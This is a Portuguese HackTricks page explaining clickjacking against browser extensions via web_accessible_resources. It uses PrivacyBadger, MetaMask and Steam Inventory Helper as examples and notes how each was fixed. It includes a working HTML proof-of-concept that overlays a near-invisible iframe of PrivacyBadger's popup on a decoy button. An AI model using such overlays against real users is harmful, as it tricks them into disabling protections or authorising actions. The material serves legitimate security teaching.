# BrowExt - ClickJacking

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informa√ß√µes B√°sicas

Esta p√°gina vai explorar uma vulnerabilidade de ClickJacking em uma extens√£o do navegador.\
Se voc√™ n√£o sabe o que √© ClickJacking, confira:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

As extens√µes cont√™m o arquivo **`manifest.json`** e esse arquivo JSON tem um campo `web_accessible_resources`. Veja o que [a documenta√ß√£o do Chrome](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) diz sobre isso:

> Esses recursos estariam dispon√≠veis em uma p√°gina da web via o URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, que pode ser gerado com o m√©todo **`extension.getURL`**. Recursos permitidos s√£o servidos com cabe√ßalhos CORS apropriados, ent√£o eles est√£o dispon√≠veis por mecanismos como XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Os **`web_accessible_resources`** em uma extens√£o do navegador n√£o s√£o apenas acess√≠veis via web; eles tamb√©m operam com os privil√©gios inerentes da extens√£o. Isso significa que eles t√™m a capacidade de:

- Alterar o estado da extens√£o
- Carregar recursos adicionais
- Interagir com o navegador at√© certo ponto

No entanto, esse recurso apresenta um risco de seguran√ßa. Se um recurso dentro de **`web_accessible_resources`** tiver alguma funcionalidade significativa, um atacante poderia potencialmente incorporar esse recurso em uma p√°gina da web externa. Usu√°rios desavisados que visitam essa p√°gina podem inadvertidamente ativar esse recurso incorporado. Essa ativa√ß√£o poderia levar a consequ√™ncias n√£o intencionais, dependendo das permiss√µes e capacidades dos recursos da extens√£o.

## Exemplo do PrivacyBadger

Na extens√£o PrivacyBadger, foi identificada uma vulnerabilidade relacionada ao diret√≥rio `skin/` sendo declarado como `web_accessible_resources` da seguinte maneira (Confira o post original [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Esta configura√ß√£o levou a um problema de seguran√ßa potencial. Especificamente, o arquivo `skin/popup.html`, que √© renderizado ao interagir com o √≠cone do PrivacyBadger no navegador, poderia ser incorporado dentro de um `iframe`. Essa incorpora√ß√£o poderia ser explorada para enganar os usu√°rios a clicar inadvertidamente em "Desativar o PrivacyBadger para este Site". Tal a√ß√£o comprometeria a privacidade do usu√°rio ao desativar a prote√ß√£o do PrivacyBadger e potencialmente sujeitar o usu√°rio a um rastreamento aumentado. Uma demonstra√ß√£o visual desse exploit pode ser vista em um exemplo de v√≠deo de ClickJacking fornecido em [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Para resolver essa vulnerabilidade, uma solu√ß√£o direta foi implementada: a remo√ß√£o de `/skin/*` da lista de `web_accessible_resources`. Essa altera√ß√£o mitigou efetivamente o risco, garantindo que o conte√∫do do diret√≥rio `skin/` n√£o pudesse ser acessado ou manipulado por meio de recursos acess√≠veis pela web.

A corre√ß√£o foi simples: **remover `/skin/*` dos `web_accessible_resources**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Exemplo do Metamask

Um [**post de blog sobre um ClickJacking no Metamask pode ser encontrado aqui**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Neste caso, o Metamask corrigiu a vulnerabilidade verificando se o protocolo usado para acess√°-lo era **`https:`** ou **`http:`** (n√£o **`chrome:`** por exemplo):

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Outro ClickJacking corrigido** na extens√£o do Metamask foi que os usu√°rios podiam **Clicar para autorizar** quando uma p√°gina era suspeita de ser phishing por causa de `‚Äúweb_accessible_resources‚Äù: [‚Äúinpage.js‚Äù, ‚Äúphishing.html‚Äù]`. Como essa p√°gina era vulner√°vel ao Clickjacking, um atacante poderia abusar dela mostrando algo normal para fazer a v√≠tima clicar para autorizar sem perceber, e depois voltar para a p√°gina de phishing que seria autorizada.

## Exemplo do Steam Inventory Helper

Verifique a seguinte p√°gina para ver como um **XSS** em uma extens√£o do navegador foi encadeado com uma vulnerabilidade de **ClickJacking**:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Refer√™ncias

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
